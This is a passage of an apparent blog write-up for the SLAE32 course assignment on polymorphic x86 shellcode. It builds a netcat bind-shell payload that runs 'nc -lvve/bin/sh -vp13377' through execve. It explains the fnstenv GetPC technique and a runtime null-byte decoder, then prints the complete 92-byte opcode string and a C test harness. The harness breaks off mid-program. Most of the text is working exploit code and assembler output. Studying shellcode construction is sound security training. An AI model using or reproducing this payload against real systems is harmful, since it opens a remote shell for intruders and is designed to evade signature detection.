+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">mov</span> <span style="color:#66d9ef">al</span>, <span style="color:#ae81ff">0xc</span>
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">fnop</span>
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">jmp</span> <span style="color:#66d9ef">short</span> <span style="color:#66d9ef">argParser</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">sub</span>   <span style="color:#66d9ef">eax</span>,<span style="color:#ae81ff">0x6576766c</span>    <span style="color:#75715e">; \xe8\x0e\x00\x00\x00
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#a6e22e">das</span>
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">bound</span>  <span style="color:#66d9ef">ebp</span>, [<span style="color:#66d9ef">ecx</span><span style="color:#960050;background-color:#1e0010">+</span><span style="color:#ae81ff">0x6e</span>]
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">das</span>
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">jae</span> <span style="color:#66d9ef">$</span><span style="color:#960050;background-color:#1e0010">+</span><span style="color:#ae81ff">0x6a</span>
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">nop</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">lea</span> <span style="color:#66d9ef">ecx</span>, [<span style="color:#66d9ef">esi</span><span style="color:#960050;background-color:#1e0010">+</span><span style="color:#ae81ff">4</span>]
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">;call $ + 0x12   ;\xe8\x0d\x00\x00\x00
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">mov</span> <span style="color:#66d9ef">al</span>, <span style="color:#ae81ff">0xc</span>
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">fnop</span>
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">jmp</span> <span style="color:#66d9ef">short</span> <span style="color:#66d9ef">argParser</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">das</span>
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">bound</span>  <span style="color:#66d9ef">ebp</span>, [<span style="color:#66d9ef">ecx</span><span style="color:#960050;background-color:#1e0010">+</span><span style="color:#ae81ff">0x6e</span>]
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">das</span>
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">das</span>
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">das</span>
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">das</span>
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">das</span>
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">das</span>
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">outsb</span>
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">arpl</span> <span style="color:#66d9ef">word</span> [<span style="color:#66d9ef">eax</span>],<span style="color:#66d9ef">bx</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">lea</span> <span style="color:#66d9ef">ebx</span>, [<span style="color:#66d9ef">esi</span><span style="color:#960050;background-color:#1e0010">+</span><span style="color:#ae81ff">4</span>]
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">push</span> <span style="color:#66d9ef">eax</span>
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">push</span> <span style="color:#66d9ef">edx</span>
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">push</span> <span style="color:#66d9ef">ecx</span>
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">push</span> <span style="color:#66d9ef">ebx</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">cdq</span>             <span style="color:#75715e">; clear edx because is one of execve&#39;s arguments --&gt; char *const envp[]
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#a6e22e">mov</span>  <span style="color:#66d9ef">ecx</span>,<span style="color:#66d9ef">esp</span>
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">mov</span> <span style="color:#66d9ef">al</span>, <span style="color:#ae81ff">0xb</span>
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">int</span> <span style="color:#ae81ff">0x80</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>argParser:          <span style="color:#75715e">; similar to jmp-call-pop but calls to a nop byte which can
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>                    <span style="color:#75715e">; assmuming al has the right distance
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    <span style="color:#a6e22e">fnstenv</span> [<span style="color:#66d9ef">esp-0xc</span>]
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">pop</span> <span style="color:#66d9ef">esi</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">mov</span> <span style="color:#66d9ef">byte</span> [<span style="color:#66d9ef">esi</span> <span style="color:#960050;background-color:#1e0010">+</span> <span style="color:#ae81ff">0x4</span> <span style="color:#960050;background-color:#1e0010">+</span> <span style="color:#66d9ef">eax</span>], <span style="color:#66d9ef">ah</span> <span style="color:#75715e">; null-byte decoder
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    <span style="color:#a6e22e">lea</span> <span style="color:#66d9ef">edi</span>, [<span style="color:#66d9ef">esi</span> <span style="color:#960050;background-color:#1e0010">+</span> <span style="color:#ae81ff">0x4</span><span style="color:#960050;background-color:#1e0010">+</span><span style="color:#66d9ef">eax</span><span style="color:#960050;background-color:#1e0010">+</span><span style="color:#ae81ff">0x1</span>]
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">xor</span> <span style="color:#66d9ef">eax</span>,<span style="color:#66d9ef">eax</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">jmp</span> <span style="color:#66d9ef">edi</span>
+</span></span></code></pre></div><p>The approach idea is the same as the <code>Approach 2</code> from the Null Byte shellcode, but this uses the <code>fnstenv</code> technique from the x87 FPU to store the FPU related instruction address instead of using <code>call</code>. This technique was mentioned during the course but it involved to research on our own to understand how we can use it.</p>
+<p>To put the shellcode working with this technique, the logic needed to be completely redesigned.</p>
+<h4 id="the-fnstenv-technique">The FNSTENV Technique<a hidden class="anchor" aria-hidden="true" href="#the-fnstenv-technique">#</a></h4>
+<p>There are alternative methods in shellcode for finding the value of the EIP register using instructions that contain no null bytes. One of those methods uses an FPU instruction.</p>
+<p>Below the image from FPU section in <a href="https://www.intel.com/content/dam/www/public/us/en/documents/manuals/64-ia-32-architectures-software-developer-vol-1-manual.pdf">Intel&rsquo;s manual</a>, shows how the FPU memory organization.</p>
+<p><img loading="lazy" src="/slae32/6/fnstenv.png#center" alt="FNSTENV"  title="FNSTENV"  />
+</p>
+<p>When FSTENV instruction is preceded by some other FPU instruction (in our case, it is <code>fnop</code>), then the result of the <code>fnstenv</code> is pushed on to the stack, and the result is none other than the address of the previous FPU instruction.</p>
+<p>For this exercise I used <code>fnop</code> instruction. It can <code>fldz</code> or other FPU related isntruction to use this technique. just make sure to be an FPU isntruction.</p>
+<p>PoC code with <code>fnstenv</code></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-asm" data-lang="asm"><span style="display:flex;"><span>l1: <span style="color:#a6e22e">fnop</span>
+</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">fnstenv</span> [<span style="color:#66d9ef">esp-0c</span>]  <span style="color:#75715e">; FPU Instruction Pointer (FIP)
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  <span style="color:#a6e22e">pop</span> <span style="color:#66d9ef">eax</span>
+</span></span><span style="display:flex;"><span>l2: <span style="color:#a6e22e">...</span>
+</span></span></code></pre></div><p>The result of the above two FPU instructions will be the address of <code>fnop</code> instruction gets saved on to the stack.</p>
+<p>When l2 is reached, <code>the value in the eax register will be the address of l1</code>.</p>
+<h5 id="debugging-fnstenv">Debugging fnstenv<a hidden class="anchor" aria-hidden="true" href="#debugging-fnstenv">#</a></h5>
+<p>Debugging the code with the <code>fnstenv</code> technique was a complete madness to my head.</p>
+<p>I figured out that performing single-stepping debugging over the <code>fnop</code> instruction results in a completely different value in the <code>eax</code> register. This means that the code could be altered in a very subtle way.</p>
+<p>So, the solution was place a breakpoint in <code>fnop</code> and the instruction  after the <code>fnstenv</code>. In our code is <code>pop esi</code></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-asm" data-lang="asm"><span style="display:flex;"><span><span style="color:#a6e22e">mov</span> <span style="color:#66d9ef">al</span>, <span style="color:#ae81ff">0x8</span>
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">fnop</span>                                <span style="color:#75715e">; breakpoint here
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#a6e22e">jmp</span> <span style="color:#66d9ef">short</span> <span style="color:#66d9ef">argParser</span>
+</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">[</span><span style="color:#a6e22e">...</span>]
+</span></span><span style="display:flex;"><span>argParser:          
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">fnstenv</span> [<span style="color:#66d9ef">esp-0xc</span>]
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">pop</span> <span style="color:#66d9ef">esi</span>                         <span style="color:#75715e">; breakpoint here
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    <span style="color:#a6e22e">mov</span> <span style="color:#66d9ef">byte</span> [<span style="color:#66d9ef">esi</span> <span style="color:#960050;background-color:#1e0010">+</span> <span style="color:#ae81ff">0x4</span> <span style="color:#960050;background-color:#1e0010">+</span> <span style="color:#66d9ef">eax</span>], <span style="color:#66d9ef">ah</span> 
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">lea</span> <span style="color:#66d9ef">edi</span>, [<span style="color:#66d9ef">esi</span> <span style="color:#960050;background-color:#1e0010">+</span> <span style="color:#ae81ff">0x4</span><span style="color:#960050;background-color:#1e0010">+</span><span style="color:#66d9ef">eax</span><span style="color:#960050;background-color:#1e0010">+</span><span style="color:#ae81ff">0x1</span>]
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">xor</span> <span style="color:#66d9ef">eax</span>,<span style="color:#66d9ef">eax</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">jmp</span> <span style="color:#66d9ef">edi</span>
+</span></span></code></pre></div><p>Between these instructions I executed the program normally to avoid the unstable behaviour <code>fnstenv</code> causes when performing single-step debugging.</p>
+<blockquote>
+<p>Debug section taken from <code>VirtualPC-specific</code> section in <a href="https://www.virusbulletin.com/virusbulletin/2010/11/anti-unpacker-tricks-part-fourteen">https://www.virusbulletin.com/virusbulletin/2010/11/anti-unpacker-tricks-part-fourteen</a></p>
+</blockquote>
+<hr>
+<h4 id="methodology">Methodology<a hidden class="anchor" aria-hidden="true" href="#methodology">#</a></h4>
+<p>As well as the previous shellcode, the code is divided in parts related to each argument of the command to executed by execve.</p>
+<p>This time, each part is delimited by a <code>mov, fnop, jmp</code> and a <code>lea</code> instructions. The instructions inside this part are used to prepare one of the execve&rsquo;s arguments.</p>
+<p>The <code>mov, fnop, jmp</code> instructions prepare the environment to store EIP address and to store the bytes in the related register to the <code>execve</code> argument.</p>
+<p>The <code>lea $REGISTER, [esi+4]</code> instruction is used to put the address pointer of the argument from <code>esp</code> to the related register depending on <code>each argument position of execve</code> we are dealing.</p>
+<p>So the <code>lea</code> instruction will tell us what execve argument we were preparing of.</p>
+<p>Let&rsquo;s take a the &ldquo;piece&rdquo; of code for one of the arguments from our shellcode and dig into it.</p>
+<p>We&rsquo;ll be analyzing what we put in the <code>edx</code> register.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-asm" data-lang="asm"><span style="display:flex;"><span><span style="color:#75715e">; start of edx section argument
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#a6e22e">mov</span> <span style="color:#66d9ef">al</span>, <span style="color:#ae81ff">0x8</span>             <span style="color:#75715e">; distance from sub to nop
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#a6e22e">fnop</span>                    <span style="color:#75715e">; FPU instruction used to store instruction pointer in FPU stack
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#a6e22e">jmp</span> <span style="color:#66d9ef">short</span> <span style="color:#66d9ef">argParser</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">sub</span>    <span style="color:#66d9ef">eax</span>,<span style="color:#ae81ff">0x33317076</span>
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">xor</span>    <span style="color:#66d9ef">esi</span>,<span style="color:#66d9ef">DWORD</span> [<span style="color:#66d9ef">edi</span>]
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">aaa</span>
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">nop</span>                     <span style="color:#75715e">; avoid null byte. changed in runtime to null
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">lea</span> <span style="color:#66d9ef">edx</span>, [<span style="color:#66d9ef">esi</span><span style="color:#960050;background-color:#1e0010">+</span><span style="color:#ae81ff">4</span>]
+</span></span><span style="display:flex;"><span><span style="color:#75715e">; end of edx section argument
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">;----------------------------------------
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">; starting preparing next argument
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#a6e22e">mov</span> <span style="color:#66d9ef">al</span>, <span style="color:#ae81ff">0xc</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">[</span><span style="color:#a6e22e">...</span>]
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>argParser:          
+</span></span><span style="display:flex;"><span>                    
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">fnstenv</span> [<span style="color:#66d9ef">esp-0xc</span>]              <span style="color:#75715e">; Storing fnop address onto the stack
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    <span style="color:#a6e22e">pop</span> <span style="color:#66d9ef">esi</span>                        <span style="color:#75715e">; put stored FIP address in esi
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    <span style="color:#a6e22e">mov</span> <span style="color:#66d9ef">byte</span> [<span style="color:#66d9ef">esi</span> <span style="color:#960050;background-color:#1e0010">+</span> <span style="color:#ae81ff">0x4</span> <span style="color:#960050;background-color:#1e0010">+</span> <span style="color:#66d9ef">eax</span>], <span style="color:#66d9ef">ah</span> <span style="color:#75715e">; null-byte decoder --&gt; change nop to null
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    <span style="color:#a6e22e">lea</span> <span style="color:#66d9ef">edi</span>, [<span style="color:#66d9ef">esi</span> <span style="color:#960050;background-color:#1e0010">+</span> <span style="color:#ae81ff">0x4</span><span style="color:#960050;background-color:#1e0010">+</span><span style="color:#66d9ef">eax</span><span style="color:#960050;background-color:#1e0010">+</span><span style="color:#ae81ff">0x1</span>]   <span style="color:#75715e">; load the address of lea edx, [esi+4] instruction
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    <span style="color:#a6e22e">xor</span> <span style="color:#66d9ef">eax</span>,<span style="color:#66d9ef">eax</span>                    <span style="color:#75715e">; zeroed eax before executing next argument section
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    <span style="color:#a6e22e">jmp</span> <span style="color:#66d9ef">edi</span>                        <span style="color:#75715e">; jump to instruction lea edx, [esi+4]
+</span></span></span></code></pre></div><p>First, we move to al the distance from the first byte of the argument to be placed in <code>edx</code> to the <code>nop</code> isntruction. We don&rsquo;t consider <code>fnop</code> and <code>jmp</code> opcodes because this are always equal across every argument section, so they considered in the <code>ArgParser</code> branch.</p>
+<p>We can use <code>objdump</code> to verify that the distance between <code>sub  eax,0x33317076</code> and <code>nop</code> is 8 bytes.</p>
+<pre tabindex="0"><code>
+8049004:       d9 d0                   fnop
+8049006:       eb 43                   jmp    804904b &lt;argParser&gt;
+8049008:       2d 76 70 31 33          sub    eax,0x33317076
+804900d:       33 37                   xor    esi,DWORD PTR [edi]
+804900f:       37                      aaa
+8049010:       90                      nop
+
+0x8049010 - 0x8049008 = 0x8 bytes
+</code></pre><p>Then, we execute an FPU instruction to store the <code>fnop</code> address in the FPU stack. This address will be the reference to our further actions. Next, we jump to the <code>ArgParser</code> branch.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-asm" data-lang="asm"><span style="display:flex;"><span><span style="color:#a6e22e">mov</span> <span style="color:#66d9ef">al</span>, <span style="color:#ae81ff">0x8</span>             <span style="color:#75715e">; distance from sub to nop
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#a6e22e">fnop</span>                    <span style="color:#75715e">; FPU instruction used to store instruction pointer in FPU stack
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#a6e22e">jmp</span> <span style="color:#66d9ef">short</span> <span style="color:#66d9ef">argParser</span>
+</span></span></code></pre></div><p>In this branch is where <code>all the magic happens</code>.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-asm" data-lang="asm"><span style="display:flex;"><span>argParser:          
+</span></span><span style="display:flex;"><span>                    
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">fnstenv</span> [<span style="color:#66d9ef">esp-0xc</span>]              <span style="color:#75715e">; Storing fnop address onto the stack
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    <span style="color:#a6e22e">pop</span> <span style="color:#66d9ef">esi</span>                        <span style="color:#75715e">; put stored FIP address in esi
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    <span style="color:#a6e22e">mov</span> <span style="color:#66d9ef">byte</span> [<span style="color:#66d9ef">esi</span> <span style="color:#960050;background-color:#1e0010">+</span> <span style="color:#ae81ff">0x4</span> <span style="color:#960050;background-color:#1e0010">+</span> <span style="color:#66d9ef">eax</span>], <span style="color:#66d9ef">ah</span> <span style="color:#75715e">; null-byte decoder --&gt; change nop to null
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    <span style="color:#a6e22e">lea</span> <span style="color:#66d9ef">edi</span>, [<span style="color:#66d9ef">esi</span> <span style="color:#960050;background-color:#1e0010">+</span> <span style="color:#ae81ff">0x4</span><span style="color:#960050;background-color:#1e0010">+</span><span style="color:#66d9ef">eax</span><span style="color:#960050;background-color:#1e0010">+</span><span style="color:#ae81ff">0x1</span>]   <span style="color:#75715e">; load the address of lea edx, [esi+4] instruction
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    <span style="color:#a6e22e">xor</span> <span style="color:#66d9ef">eax</span>,<span style="color:#66d9ef">eax</span>                    <span style="color:#75715e">; zeroed eax before executing next argument section
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    <span style="color:#a6e22e">jmp</span> <span style="color:#66d9ef">edi</span>                        <span style="color:#75715e">; jump to instruction lea edx, [esi+4]
+</span></span></span></code></pre></div><p>First we store the <code>fnop</code> address on the stack and put that address in <code>esi</code> register.</p>
+<p>Then, remember that <code>nop</code> (0x90) byte we put in the end of the section argument?</p>
+<p>We need to put a null byte in the end but we can&rsquo;t put it explicitly. So we are going to change it to null byte with the following single instruction</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-asm" data-lang="asm"><span style="display:flex;"><span><span style="color:#a6e22e">mov</span> <span style="color:#66d9ef">byte</span> [<span style="color:#66d9ef">esi</span> <span style="color:#960050;background-color:#1e0010">+</span> <span style="color:#ae81ff">0x4</span> <span style="color:#960050;background-color:#1e0010">+</span> <span style="color:#66d9ef">eax</span>], <span style="color:#66d9ef">ah</span>  <span style="color:#75715e">; ah is always zero
+</span></span></span></code></pre></div><p>Basically we are moving the higher bytes <code>ax</code> register to the address of the <code>nop</code> byte. We know that <code>ah</code> is always because in the beginning of the shellcode we have <code>xor eax, eax</code> and in the <code>ArgParser</code> branch and we just work with <code>al</code> in each argument section. So, <code>ah</code> byte is not touched during our operations.</p>
+<p>This way a null byte is placed in the of the argument bytes marking the end of the string bytes.</p>
+<p>Let&rsquo;s demonstrate it in gdb</p>
+<p><img loading="lazy" src="/slae32/6/nop1.png#center" alt="Null-byte decoder"  title="Null-byte decoder"  />
+</p>
+<p>After changing 0x90 to 0x00. three new instructions appeared.</p>
+<p><img loading="lazy" src="/slae32/6/nop2.png#center" alt="Null-byte"  title="Null-byte"  />
+</p>
+<p>That null-byte changed also the <code>fnstenv</code> instruction. <code>What a simple thing can do, right?</code></p>
+<p>After performing this operation we need to store the argument address in edx. Basically we need to jump to the <code>lea edx, [esi+4]</code> instruction.</p>
+<p>The way our code is doing is by load to <code>edi</code> the <code>lea</code> address based on the <code>esi</code> register which holds the <code>fnop</code> instruction address, adding the distance from <code>fnop</code> to <code>esi</code> which was the former <code>nop</code> byte and adding 1 more byte to reach <code>lea edx, [esi+4]</code> from the <code>fnop</code> instruction.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-asm" data-lang="asm"><span style="display:flex;"><span><span style="color:#a6e22e">lea</span> <span style="color:#66d9ef">edi</span>, [<span style="color:#66d9ef">esi</span> <span style="color:#960050;background-color:#1e0010">+</span> <span style="color:#ae81ff">0x4</span><span style="color:#960050;background-color:#1e0010">+</span><span style="color:#66d9ef">eax</span><span style="color:#960050;background-color:#1e0010">+</span><span style="color:#ae81ff">0x1</span>]   <span style="color:#75715e">; load the address of lea edx, [esi+4] instruction
+</span></span></span></code></pre></div><p>The most tricky is done, we just need to clear <code>eax</code> to prepare the next argument section and jump to put argument address in <code>edx</code> using <code>edi</code>.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-asm" data-lang="asm"><span style="display:flex;"><span><span style="color:#a6e22e">xor</span> <span style="color:#66d9ef">eax</span>,<span style="color:#66d9ef">eax</span>                    <span style="color:#75715e">; zeroed eax before executing next argument section
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#a6e22e">jmp</span> <span style="color:#66d9ef">edi</span>                        <span style="color:#75715e">; jump to instruction lea edx, [esi+4]
+</span></span></span></code></pre></div><p>Then, it is just doing the same for the other arguments.</p>
+<p>We end our shellcode calling execve with usual process.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-asm" data-lang="asm"><span style="display:flex;"><span><span style="color:#a6e22e">push</span> <span style="color:#66d9ef">eax</span>        <span style="color:#75715e">; 0x0
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#a6e22e">push</span> <span style="color:#66d9ef">edx</span>        <span style="color:#75715e">; -vp13377
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#a6e22e">push</span> <span style="color:#66d9ef">ecx</span>        <span style="color:#75715e">; -lvve/bin/sh
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#a6e22e">push</span> <span style="color:#66d9ef">ebx</span>        <span style="color:#75715e">; /bin//////nc
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">cdq</span>             <span style="color:#75715e">; clear edx because is one of execve&#39;s arguments --&gt; char *const envp[]
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#a6e22e">mov</span>  <span style="color:#66d9ef">ecx</span>,<span style="color:#66d9ef">esp</span>
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">mov</span> <span style="color:#66d9ef">al</span>, <span style="color:#ae81ff">0xb</span>     <span style="color:#75715e">; execve syscall
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#a6e22e">int</span> <span style="color:#ae81ff">0x80</span>
+</span></span></code></pre></div><p>hecking <code>assembler.sh</code> output</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>╭─edu@debian ~/Desktop/slae_x86/assignments/6-Polymorphic-Shellcode/netcat-shellcode-804/poly ‹main●› 
+</span></span><span style="display:flex;"><span>╰─$ ../../../../assembler.sh poly_netcat.nasm                                                                                                                                                                <span style="color:#ae81ff">150</span> ↵
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Compiling with NASM
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Linking
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Extracting opcodes
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Done
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Shellcode size: <span style="color:#ae81ff">92</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#e6db74">&#34;\x31\xc0\xb0\x08\xd9\xd0\xeb\x43\x2d\x76\x70\x31\x33\x33\x37\x37\x90\x8d\x56\x04\xb0\x0c\xd9\xd0\xeb\x31\x2d\x6c\x76\x76\x65\x2f\x62\x69\x6e\x2f\x73\x68\x90\x8d\x4e\x04\xb0\x0c\xd9\xd0\xeb\x1b\x2f\x62\x69\x6e\x2f\x2f\x2f\x2f\x2f\x2f\x6e\x63\x18\x8d\x5e\x04\x50\x52\x51\x53\x99\x89\xe1\xb0\x0b\xcd\x80\xd9\x74\x24\xf4\x5e\x88\x64\x06\x04\x8d\x7c\x30\x05\x31\xc0\xff\xe7&#34;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>--------------------
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Hack the World!
+</span></span><span style="display:flex;"><span>--------------------
+</span></span></code></pre></div><p>No null bytes appear in the shellcode. We are good to go and paste the shellcode to our shellcode.c program</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#75715e">#include</span><span style="color:#75715e">&lt;stdio.h&gt;</span><span style="color:#75715e">
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#include</span><span style="color:#75715e">&lt;string.h&gt;</span><span style="color:#75715e">
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">char</span> code[] <span style="color:#f92672">=</span> \
+</span></span><span style="display:flex;"><span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x31\xc0\xb0\x08\xd9\xd0\xeb\x43\x2d\x76\x70\x31\x33\x33\x37\x37\x90\x8d\x56\x04\xb0\x0c\xd9\xd0</span><span style="color:#e6db74">&#34;</span>
+</span></span><span style="display:flex;"><span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\xeb\x31\x2d\x6c\x76\x76\x65\x2f\x62\x69\x6e\x2f\x73\x68\x90\x8d\x4e\x04\xb0\x0c\xd9\xd0\xeb\x1b</span><span style="color:#e6db74">&#34;</span>
+</span></span><span style="display:flex;"><span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x2f\x62\x69\x6e\x2f\x2f\x2f\x2f\x2f\x2f\x6e\x63\x18\x8d\x5e\x04\x50\x52\x51\x53\x99\x89\xe1\xb0\x0b</span><span style="color:#e6db74">&#34;</span>
+</span></span><span style="display:flex;"><span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\xcd\x80\xd9\x74\x24\xf4\x5e\x88\x64\x06\x04\x8d\x7c\x30\x05\x31\xc0\xff\xe7</span><span style="color:#e6db74">&#34;</span>;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">main</span>() {
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;Shellcode Length: %d</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, <span style="color:#a6e22e">strlen</span>(code));
